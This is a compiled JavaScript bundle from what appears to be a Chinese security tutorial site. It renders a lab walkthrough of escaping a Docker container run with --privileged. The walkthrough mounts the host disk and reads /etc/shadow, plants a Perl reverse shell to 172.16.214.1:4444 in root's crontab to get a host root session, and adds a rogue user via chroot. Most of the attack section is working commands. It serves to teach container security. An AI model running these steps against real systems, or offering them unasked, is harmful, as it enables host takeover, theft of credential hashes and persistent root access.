(window.webpackJsonp=window.webpackJsonp||[]).push([[13],{805:function(s,t,a){"use strict";a.r(t);var e={mounted:function(){this.$page.lastUpdated="2022年4月15日"}},n=a(112),r=Object(n.a)(e,(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("center",[a("h1",[s._v("Privileged 特权模式容器逃逸")])]),s._v(" "),a("hr"),s._v(" "),a("h1",{attrs:{id:"搭建"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#搭建"}},[s._v("#")]),s._v(" 搭建")]),s._v(" "),a("p",[s._v("例如当前有个普通用户 teamssix，并且是在 docker 用户组内的")]),s._v(" "),a("img",{attrs:{width:"1200",src:"/img/1650013515.png"}}),s._v(" "),a("p",[s._v("在普通用户下，使用 --privileged=true 创建一个容器")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" run --rm --privileged"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("true -it alpine\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h1",{attrs:{id:"检测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#检测"}},[s._v("#")]),s._v(" 检测")]),s._v(" "),a("p",[s._v("在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /proc/self/status "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" CapEff\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h1",{attrs:{id:"复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#复现"}},[s._v("#")]),s._v(" 复现")]),s._v(" "),a("h2",{attrs:{id:"方法一"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#方法一"}},[s._v("#")]),s._v(" 方法一")]),s._v(" "),a("p",[s._v("查看挂载磁盘设备")]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("fdisk -l\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("img",{attrs:{width:"1200",src:"/img/1650014398.png"}}),s._v(" "),a("p",[s._v("在容器内部执行以下命令，将宿主机文件挂载到 /test 目录下")]),s._v(" "),a("div",{staticClass:"language-json line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-json"}},[a("code",[s._v("mkdir /test && mount /dev/sda1 /test\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("尝试访问宿主机 shadow 文件，可以看到正常访问")]),s._v(" "),a("div",{staticClass:"language-json line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-json"}},[a("code",[s._v("cat /test/etc/shadow\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("img",{attrs:{width:"1200",src:"/img/1650014420.png"}}),s._v(" "),a("p",[s._v("也可以在定时任务中写入反弹 shell")]),s._v(" "),a("p",[s._v("这里的定时任务路径是 Ubuntu 系统路径，不同的系统定时任务路径不一样")]),s._v(" "),a("div",{staticClass:"language-json line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-json"}},[a("code",[s._v("echo $'*/"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" * * * * perl -e \\'use Socket;$i="),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"172.16.214.1"')]),s._v(";$p="),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v(";socket(S"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("PF_INET"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("SOCK_STREAM"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("getprotobyname("),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"tcp"')]),s._v("));if(connect(S"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("sockaddr_in($p"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("inet_aton($i))))"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("open(STDIN"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('">&S"')]),s._v(");open(STDOUT"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('">&S"')]),s._v(");open(STDERR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('">&S"')]),s._v(");exec("),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/bin/sh -i"')]),s._v(");"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(";\\'' >> /test/var/spool/cron/crontabs/root\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("一分钟后，就能收到反弹回来的会话了，而且会话权限是宿主机 root 用户权限。")]),s._v(" "),a("img",{attrs:{width:"1200",src:"/img/1650014458.png"}}),s._v(" "),a("h2",{attrs:{id:"方法二"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#方法二"}},[s._v("#")]),s._v(" 方法二")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mount")]),s._v(" /dev/sda1 /mnt\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chroot")]),s._v(" /mnt adduser john\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("通过新添加的用户登录")]),s._v(" "),a("Vssue")],1)}),[],!1,null,null,null);t.default=r.exports}}]);